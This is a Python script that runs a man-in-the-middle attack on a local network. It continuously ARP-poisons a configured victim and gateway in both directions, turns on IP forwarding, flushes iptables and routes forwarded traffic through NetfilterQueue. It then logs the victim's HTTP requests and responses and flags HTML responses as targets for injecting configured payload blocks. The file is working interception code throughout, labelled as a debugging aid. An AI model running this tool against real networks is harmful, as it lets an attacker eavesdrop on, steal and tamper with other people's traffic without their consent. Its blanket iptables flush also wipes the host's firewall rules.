#!/usr/bin/env python3
"""
Debug HTTP Interceptor - Enhanced Logging Version
Helps diagnose why HTTP requests aren't being captured
"""

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time
import re
import logging
from datetime import datetime
import subprocess
import threading
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig

# Use configuration values
victim_ip = AttackConfig.VICTIM_IP
gateway_ip = AttackConfig.GATEWAY_IP
interface = NetworkConfig.INTERFACE
victim_mac = AttackConfig.VICTIM_MAC
gateway_mac = AttackConfig.GATEWAY_MAC

# Setup VERY detailed logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('debug_http_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class DebugStats:
    """Debug statistics with detailed packet tracking"""
    def __init__(self):
        self.start_time = time.time()
        self.total_packets = 0
        self.victim_packets = 0
        self.tcp_packets = 0
        self.tcp_with_payload = 0
        self.port_80_packets = 0
        self.http_packets = 0
        self.dropped_packets = 0
        self.iptables_packets = 0
        
    def print_debug_stats(self):
        runtime = time.time() - self.start_time
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"🐛 DEBUG STATISTICS - Runtime: {runtime:.1f}s")
        print(f"{'='*60}{Style.RESET_ALL}")
        print(f"📦 Total packets processed: {self.total_packets}")
        print(f"🎯 Victim-related packets: {self.victim_packets}")
        print(f"🔗 TCP packets: {self.tcp_packets}")
        print(f"📄 TCP with payload: {self.tcp_with_payload}")
        print(f"🌐 HTTP packets (content-based): {self.port_80_packets}")
        print(f"📡 HTTP packets confirmed: {self.http_packets}")
        print(f"🗑️  Dropped packets: {self.dropped_packets}")
        print(f"🔥 iptables intercepted: {self.iptables_packets}")
        
        if self.http_packets > 0:
            print(f"\n{Fore.GREEN}✅ SUCCESS: HTTP traffic detected and captured!{Style.RESET_ALL}")
        elif self.victim_packets > 0:
            print(f"\n{Fore.YELLOW}⚠️  Victim traffic detected but no HTTP content found{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}❌ No victim traffic detected - check ARP poisoning{Style.RESET_ALL}")

debug_stats = DebugStats()

def enable_ip_forwarding():
    """Enable IP forwarding with verification"""
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            status = f.read().strip()
            if status == '1':
                logger.info("[SETUP] ✅ IP forwarding enabled successfully")
                return True
            else:
                logger.error(f"[SETUP] ❌ IP forwarding failed. Status: {status}")
                return False
    except Exception as e:
        logger.error(f"[SETUP] ❌ Could not verify IP forwarding: {e}")
        return False

def disable_ip_forwarding():
    """Disable IP forwarding"""
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison(victim_ip, victim_mac, spoof_ip):
    """Send ARP poison packet with logging"""
    try:
        pkt = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
        sendp(pkt, iface=interface, verbose=0)
        logger.debug(f"[ARP-POISON] Sent: {victim_ip} -> {spoof_ip} is at {get_if_hwaddr(interface)}")
        return True
    except Exception as e:
        logger.error(f"[ARP-POISON] Failed to send poison to {victim_ip}: {e}")
        return False

def restore(target_ip, target_mac, source_ip, source_mac):
    """Restore ARP table with logging"""
    logger.info(f"[ARP-RESTORE] Restoring {target_ip} -> {source_ip} mapping")
    try:
        pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                          psrc=source_ip, hwsrc=source_mac)
        sendp(pkt, count=5, iface=interface, verbose=0)
        logger.info(f"[ARP-RESTORE] ✅ Sent 5 restore packets for {target_ip}")
    except Exception as e:
        logger.error(f"[ARP-RESTORE] ❌ Failed to restore {target_ip}: {e}")

def analyze_packet_details(scapy_pkt):
    """Analyze packet in detail for debugging"""
    details = {
        'src_ip': scapy_pkt.src,
        'dst_ip': scapy_pkt.dst,
        'protocol': scapy_pkt.proto,
        'length': len(scapy_pkt),
        'has_tcp': scapy_pkt.haslayer(TCP),
        'has_raw': scapy_pkt.haslayer(Raw),
        'tcp_sport': None,
        'tcp_dport': None,
        'payload_size': 0,
        'payload_preview': None
    }
    
    if scapy_pkt.haslayer(TCP):
        tcp_layer = scapy_pkt[TCP]
        details['tcp_sport'] = tcp_layer.sport
        details['tcp_dport'] = tcp_layer.dport
        
        if scapy_pkt.haslayer(Raw):
            payload = scapy_pkt[Raw].load
            details['payload_size'] = len(payload)
            details['payload_preview'] = payload[:50].decode('utf-8', errors='ignore')
    
    return details

def debug_packet(packet):
    """Debug version with extensive logging"""
    try:
        debug_stats.total_packets += 1
        debug_stats.iptables_packets += 1
        
        scapy_pkt = IP(packet.get_payload())
        details = analyze_packet_details(scapy_pkt)
        
        src_ip = details['src_ip']
        dst_ip = details['dst_ip']
        
        # Log EVERY packet that reaches iptables
        if debug_stats.iptables_packets % 10 == 0:  # Every 10th packet
            logger.info(f"[IPTABLES] 🔥 Packet #{debug_stats.iptables_packets}: {src_ip} -> {dst_ip}")
        
        # Check if this traffic involves our target victim
        is_victim_traffic = (src_ip == victim_ip or dst_ip == victim_ip)
        
        if is_victim_traffic:
            debug_stats.victim_packets += 1
            logger.info(f"[VICTIM-TRAFFIC] 🎯 Packet: {src_ip} -> {dst_ip} (#{debug_stats.victim_packets})")
            
            # Log detailed packet info for victim traffic
            logger.debug(f"[VICTIM-DETAIL] Protocol: {details['protocol']}, Length: {details['length']}")
            logger.debug(f"[VICTIM-DETAIL] TCP: {details['has_tcp']}, Raw: {details['has_raw']}")
            
            if details['has_tcp']:
                debug_stats.tcp_packets += 1
                logger.info(f"[VICTIM-TCP] 🔗 TCP: {src_ip}:{details['tcp_sport']} -> {dst_ip}:{details['tcp_dport']}")
                
                if details['has_raw']:
                    debug_stats.tcp_with_payload += 1
                    logger.info(f"[VICTIM-PAYLOAD] 📄 Payload size: {details['payload_size']} bytes")
                    
                    # Check for HTTP content regardless of port - much more reliable!
                    payload_preview = details['payload_preview'].upper()
                    is_http_request = any(method in payload_preview for method in ['GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ', 'OPTIONS '])
                    is_http_response = 'HTTP/' in payload_preview
                    
                    if is_http_request or is_http_response:
                        debug_stats.port_80_packets += 1  # Reuse counter for HTTP packets
                        packet_type = "REQUEST" if is_http_request else "RESPONSE"
                        logger.warning(f"[HTTP-CONTENT] 🌐 HTTP {packet_type} detected: {src_ip}:{details['tcp_sport']} -> {dst_ip}:{details['tcp_dport']}")
                        logger.warning(f"[HTTP-CONTENT] 📝 Payload preview: {details['payload_preview']}")
                        
                        debug_stats.http_packets += 1
                        logger.error(f"[HTTP-FOUND] 📡 HTTP {packet_type} DETECTED!")
                        logger.error(f"[HTTP-FOUND] 🔍 Full preview: {details['payload_preview']}")
                        
                        # This is what we want to capture!
                        print(f"\n{Fore.RED}🚨 HTTP {packet_type} FOUND! 🚨{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}Source: {src_ip}:{details['tcp_sport']}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}Destination: {dst_ip}:{details['tcp_dport']}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}Port: {details['tcp_sport']} -> {details['tcp_dport']}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}Payload: {details['payload_preview']}{Style.RESET_ALL}")
                        
                        # Show more details for HTML responses
                        if is_http_response and 'text/html' in payload_preview.lower():
                            print(f"{Fore.GREEN}🎯 HTML RESPONSE - Perfect for injection!{Style.RESET_ALL}")
                            print(f"{Fore.BLUE}💉 Will inject: {AttackConfig.CURRENT_HTML_INJECTION} block{Style.RESET_ALL}")
                            injection_size = len(AttackConfig.HTML_INJECTION_BLOCKS.get(AttackConfig.CURRENT_HTML_INJECTION, b''))
                            print(f"{Fore.BLUE}📏 Injection size: {injection_size} bytes{Style.RESET_ALL}")
                    
                    elif details['payload_size'] > 50:  # Show large non-HTTP payloads for debugging
                        logger.debug(f"[NON-HTTP] 📄 Large payload ({details['payload_size']} bytes) on port {details['tcp_sport']}->{details['tcp_dport']}: {details['payload_preview']}")
                        if details['payload_size'] > 200:  # Only show console output for very large payloads
                            print(f"\n{Fore.CYAN}📦 LARGE NON-HTTP PACKET ({details['payload_size']} bytes){Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}Source: {src_ip}:{details['tcp_sport']}{Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}Destination: {dst_ip}:{details['tcp_dport']}{Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}Payload: {details['payload_preview']}{Style.RESET_ALL}")
        
        # Accept all packets in debug mode
        packet.accept()
        
    except Exception as e:
        logger.error(f"[DEBUG-ERROR] Error processing packet: {e}")
        debug_stats.dropped_packets += 1
        packet.accept()

def setup_iptables_debug():
    """Setup iptables with debug logging"""
    logger.info("[SETUP] Setting up iptables rules with debug logging")
    
    # Clear existing rules
    os.system("iptables -F")
    os.system("iptables -X")
    
    # Add logging rule first (optional)
    os.system("iptables -I FORWARD -j LOG --log-prefix='FORWARD: ' --log-level 4")
    
    # Add NFQUEUE rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    
    # Verify rules
    try:
        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n', '-v'], 
                              capture_output=True, text=True)
        logger.info("[SETUP] Current iptables FORWARD rules:")
        for line in result.stdout.split('\n'):
            if line.strip():
                logger.info(f"[SETUP] {line}")
        
        if 'NFQUEUE' in result.stdout:
            logger.info("[SETUP] ✅ NFQUEUE rule added successfully")
            return True
        else:
            logger.error("[SETUP] ❌ NFQUEUE rule NOT found")
            return False
    except Exception as e:
        logger.error(f"[SETUP] ❌ Error checking iptables: {e}")
        return False

def check_network_setup():
    """Check network setup and routing"""
    logger.info("[DEBUG] Checking network setup...")
    
    # Check interface
    try:
        result = subprocess.run(['ip', 'addr', 'show', interface], 
                              capture_output=True, text=True)
        logger.info(f"[DEBUG] Interface {interface} status:")
        for line in result.stdout.split('\n')[:5]:  # First 5 lines
            if line.strip():
                logger.info(f"[DEBUG] {line.strip()}")
    except Exception as e:
        logger.error(f"[DEBUG] Error checking interface: {e}")
    
    # Check routing
    try:
        result = subprocess.run(['ip', 'route', 'show'], 
                              capture_output=True, text=True)
        logger.info("[DEBUG] Routing table:")
        for line in result.stdout.split('\n')[:5]:  # First 5 lines
            if line.strip():
                logger.info(f"[DEBUG] {line.strip()}")
    except Exception as e:
        logger.error(f"[DEBUG] Error checking routes: {e}")
    
    # Check ARP table
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
        logger.info("[DEBUG] ARP table entries for our targets:")
        for line in result.stdout.split('\n'):
            if victim_ip in line or gateway_ip in line:
                logger.info(f"[DEBUG] {line.strip()}")
    except Exception as e:
        logger.error(f"[DEBUG] Error checking ARP: {e}")

def start_debug_interception():
    """Start debug packet interception"""
    logger.info("[DEBUG] Starting debug HTTP interception")
    
    # Check network setup first
    check_network_setup()
    
    # Setup iptables
    if not setup_iptables_debug():
        logger.error("[DEBUG] ❌ Failed to setup iptables")
        return False
    
    # Start NetfilterQueue
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, debug_packet)
    
    print(f"\n{Fore.GREEN}🐛 DEBUG HTTP INTERCEPTOR STARTED{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📡 Server: {gateway_ip} (MAC: {gateway_mac}){Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 Victim: {victim_ip} (MAC: {victim_mac}){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}🔍 Watching for ALL traffic involving victim{Style.RESET_ALL}")
    print(f"{Fore.RED}🚨 Will show detailed logs for HTTP packets{Style.RESET_ALL}")
    print(f"{Fore.WHITE}🛑 Press Ctrl+C to stop and view statistics{Style.RESET_ALL}")
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[DEBUG] 🛑 Stopping debug interceptor...{Style.RESET_ALL}")
    finally:
        nfqueue.unbind()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        debug_stats.print_debug_stats()

def main():
    """Main debug function"""
    print(f"\n{Fore.CYAN}{'='*70}")
    print("🐛 DEBUG HTTP INTERCEPTOR")
    print("Enhanced logging to diagnose HTTP capture issues")
    print(f"{'='*70}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}📋 CURRENT CONFIGURATION:{Style.RESET_ALL}")
    print(f"   Server (Gateway): {gateway_ip} ({gateway_mac})")
    print(f"   Client (Victim): {victim_ip} ({victim_mac})")
    print(f"   Interface: {interface}")
    print(f"   Attacker MAC: {get_if_hwaddr(interface)}")
    
    print(f"\n{Fore.BLUE}🔍 DEBUG FEATURES:{Style.RESET_ALL}")
    print("   • Logs ALL packets reaching iptables")
    print("   • Detailed analysis of victim traffic")
    print("   • Special highlighting of HTTP packets")
    print("   • Network setup verification")
    print("   • Comprehensive statistics")
    
    # Ask for confirmation
    if SecurityConfig.REQUIRE_CONFIRMATION:
        confirmation = input(f"\n🔍 Start debug HTTP interceptor? [y/N]: ").lower().strip()
        if confirmation not in ['y', 'yes']:
            print(f"{Fore.YELLOW}❌ Debug cancelled by user.{Style.RESET_ALL}")
            sys.exit(0)
    
    logger.info("[DEBUG] 🚀 Starting debug HTTP interceptor")
    logger.info(f"[DEBUG] Attacker MAC: {get_if_hwaddr(interface)}")
    
    # Enable IP forwarding
    if not enable_ip_forwarding():
        logger.error("❌ Failed to enable IP forwarding")
        sys.exit(1)

    def exit_gracefully(signum, frame):
        logger.info(f"\n[CLEANUP] 🧹 Starting cleanup process...")
        logger.info("[CLEANUP] Restoring ARP tables...")
        
        # Restore ARP tables
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        
        disable_ip_forwarding()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        logger.info("[CLEANUP] ✅ Cleanup complete")
        
        # Print final statistics
        debug_stats.print_debug_stats()
        sys.exit(0)

    signal.signal(signal.SIGINT, exit_gracefully)

    # Start ARP poisoning in background
    def poison_loop():
        logger.info("[ARP-POISON] 🎯 Starting continuous ARP poisoning")
        logger.info(f"[ARP-POISON] Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
        
        poison_count = 0
        while True:
            # Bidirectional poisoning
            success1 = poison(victim_ip, victim_mac, gateway_ip)
            success2 = poison(gateway_ip, gateway_mac, victim_ip)
            
            poison_count += 2
            if poison_count % 10 == 0:  # Log every 10 rounds
                logger.info(f"[ARP-POISON] Sent {poison_count} poison packets (Success: {success1 and success2})")
            
            time.sleep(AttackConfig.ARP_POISON_INTERVAL)

    poison_thread = threading.Thread(target=poison_loop, daemon=True)
    poison_thread.start()
    
    # Give ARP poisoning time to take effect
    logger.info("[DEBUG] Waiting 5 seconds for ARP poisoning to take effect...")
    time.sleep(5)
    
    # Check ARP poisoning effect
    logger.info("[DEBUG] Checking ARP poisoning effect...")
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if victim_ip in line or gateway_ip in line:
                logger.info(f"[ARP-CHECK] {line.strip()}")
    except:
        pass

    # Start HTTP interception
    start_debug_interception()

if __name__ == "__main__":
    main() 